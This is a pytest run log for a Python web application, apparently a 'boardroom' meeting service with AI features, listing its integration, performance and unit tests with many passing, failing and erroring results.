============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_throughput_under_sustained_load ERROR [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_root_endpoint_standard_format PASSED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_health_endpoint_standard_format PASSED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_standard_headers_present FAILED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_version_info_endpoint FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_standards_documentation PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_error_codes_documentation PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_examples_endpoint PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_detailed_health_endpoint FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_error_response_consistency FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_validation_error_consistency PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_cors_headers_present FAILED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_openapi_spec_available PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_documentation_pages_accessible PASSED [  6%]
tests/integration/test_api_standards.py::TestRateLimitingStandards::test_rate_limit_headers_present PASSED [  6%]
tests/integration/test_api_standards.py::TestRateLimitingStandards::test_rate_limit_documentation PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_version_in_url_path PASSED [  7%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_version_header_support FAILED [  7%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_unsupported_version_handling FAILED [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_success ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_credentials ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_wrong_password ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_inactive_user ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_input ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_success ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_duplicate_email ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_weak_password ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_invalid_input ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_valid_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_invalid_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_without_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_register_login_flow ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_multiple_login_attempts ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_sql_injection_prevention ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_xss_prevention_in_registration ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_password_not_returned_in_responses ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_case_insensitive_email_handling ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationRateLimiting::test_login_rate_limiting ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_success ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_unauthorized ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_missing_token ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_invalid_input ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_not_found ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_list_boardrooms_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_not_owner ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_not_owner ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_create_session_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_get_session_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_list_sessions_success ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_end_session_success ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_admin_can_access_any_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_cannot_access_private_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_can_access_public_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_name_validation ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_settings_validation ERROR [ 14%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_database_error_handling ERROR [ 14%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_concurrent_access_handling ERROR [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_database_health_check PASSED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_redis_health_check FAILED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_system_resources_health_check PASSED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_ready PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_alive PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_dependencies_status PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_initialization PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_success PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_failure_threshold PASSED [ 16%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_blocks_when_open PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_success_on_first_attempt PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_with_failures PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_max_attempts_exceeded PASSED [ 16%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_basic_health_endpoint FAILED [ 16%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_readiness_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_liveness_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_detailed_health_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_dependencies_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_circuit_breakers_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_metrics_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching PASSED [ 18%]
tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_success FAILED [ 18%]
tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_failure FAILED [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_healthy ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_unhealthy_database ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_root_endpoint ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_with_migration_status ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_success ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_empty ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_with_timeframe ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_invalid_timeframe ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_success ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_degraded ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint_invalid_data ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_system_metrics_success ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_application_metrics_success ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_prometheus_metrics_endpoint ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_require_admin ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_allow_admin ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_health_endpoint_public_access ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_prometheus_metrics_public_access ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_error_summary_service_failure ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_metrics_collection_failure ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_health_check_partial_failure ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_monitoring_endpoints_response_time ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_concurrent_monitoring_requests ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_large_error_summary_handling ERROR [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_agent_initialization_time FAILED [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_single_query_response_time FAILED [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_concurrent_queries_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_memory_usage_single_query FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_streaming_response_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_chat_history_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_sustained_load_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_agenda_creation_performance ERROR [ 23%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_decision_support_performance ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_minutes_generation_performance ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_concurrent_tool_execution ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tools_memory_efficiency ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tool_response_time_consistency ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_creation_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_update_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_retrieval_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_concurrent_state_operations PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_checkpoint_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_cleanup_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_manager_memory_efficiency PASSED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_active_sessions_performance PASSED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_high_concurrency_ai_operations FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_sustained_load_performance FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_resource_exhaustion_handling FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_memory_pressure_handling FAILED [ 26%]
tests/performance/test_performance.py::TestAPIPerformance::test_health_endpoint_response_time ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_auth_endpoint_performance ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_boardroom_creation_performance ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_concurrent_health_checks ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[5] ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[10] ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[20] ERROR [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_token_creation_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_token_verification_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_string_sanitization_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_dict_sanitization_performance PASSED [ 28%]
tests/performance/test_performance.py::TestDatabaseServicePerformance::test_database_initialization_performance FAILED [ 28%]
tests/performance/test_performance.py::TestDatabaseServicePerformance::test_session_context_manager_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_error_recording_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_error_summary_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_health_status_performance PASSED [ 29%]
tests/performance/test_performance.py::TestMemoryUsage::test_token_creation_memory_usage PASSED [ 29%]
tests/performance/test_performance.py::TestMemoryUsage::test_error_monitoring_memory_usage FAILED [ 29%]
tests/performance/test_performance.py::TestLoadTesting::test_sustained_health_check_load ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[5] ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[10] ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[20] ERROR [ 30%]
tests/performance/test_performance.py::test_performance_baselines_defined PASSED [ 30%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_response_compression PASSED [ 30%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_cache_headers PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_payload_optimization PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_middleware_cache_integration PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_memory_monitoring PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_resource_cleanup PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_ai_memory_optimization PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_memory_pressure_handling PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_multi_level_cache_operations PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_statistics PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_expiration PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_eviction PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_predictive_cache_patterns PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cached_decorator PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_performance_endpoint PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_memory_optimization_under_load PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_cache_hit_ratio_target PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_response_time_targets PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_memory_usage_target PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_ai_operation_response_time PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_health_endpoint PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_root_endpoint PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_performance_endpoint_availability PASSED [ 34%]
tests/test_basic_infrastructure.py::test_pytest_configuration PASSED     [ 34%]
tests/test_basic_infrastructure.py::test_faker_availability PASSED       [ 34%]
tests/test_basic_infrastructure.py::test_sample_user_data_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_sample_boardroom_data_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_user_factory_fixture PASSED     [ 35%]
tests/test_basic_infrastructure.py::test_boardroom_factory_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_realistic_test_scenario_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_error_response_factory PASSED   [ 35%]
tests/test_basic_infrastructure.py::test_testing_environment_variables PASSED [ 36%]
tests/test_basic_infrastructure.py::test_coverage_configuration PASSED   [ 36%]
tests/test_basic_infrastructure.py::test_async_test_support PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_slow_marker PASSED              [ 36%]
tests/test_basic_infrastructure.py::test_mock_functionality PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_httpx_availability PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_test_settings_fixture PASSED    [ 37%]
tests/test_infrastructure.py::test_database_session_fixture ERROR        [ 37%]
tests/test_infrastructure.py::test_async_client_fixture ERROR            [ 37%]
tests/test_infrastructure.py::test_health_check_endpoint ERROR           [ 37%]
tests/test_infrastructure.py::test_root_endpoint ERROR                   [ 37%]
tests/test_infrastructure.py::test_sample_user_data_fixture PASSED       [ 38%]
tests/test_infrastructure.py::test_sample_boardroom_data_fixture PASSED  [ 38%]
tests/test_infrastructure.py::test_user_factory_fixture PASSED           [ 38%]
tests/test_infrastructure.py::test_boardroom_factory_fixture PASSED      [ 38%]
tests/test_infrastructure.py::test_mock_langfuse_fixture ERROR           [ 38%]
tests/test_infrastructure.py::test_mock_llm_service_fixture ERROR        [ 38%]
tests/test_infrastructure.py::test_realistic_test_scenario_fixture PASSED [ 39%]
tests/test_infrastructure.py::test_performance_fixture_availability PASSED [ 39%]
tests/test_infrastructure.py::test_error_response_factory PASSED         [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_state_manager_initialization PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_success PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_already_exists PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_error PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_memory PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_database PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_not_found PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_success PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_locked PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_force_update PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_not_found PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_checkpoint_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_not_found PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_conversation_state_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_active_sessions PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_cleanup_expired_states PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_persist_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_persisted_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_session_context_manager PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_exists PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_singleton PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_full_lifecycle PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_concurrent_access_simulation PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_default_expiry PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_custom_expiry PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_includes_sanitized_jti FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_valid FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_format FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_signature FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_expired PASSED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_missing_subject PASSED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_malformed_jwt PASSED [ 45%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_type_validation PASSED [ 45%]
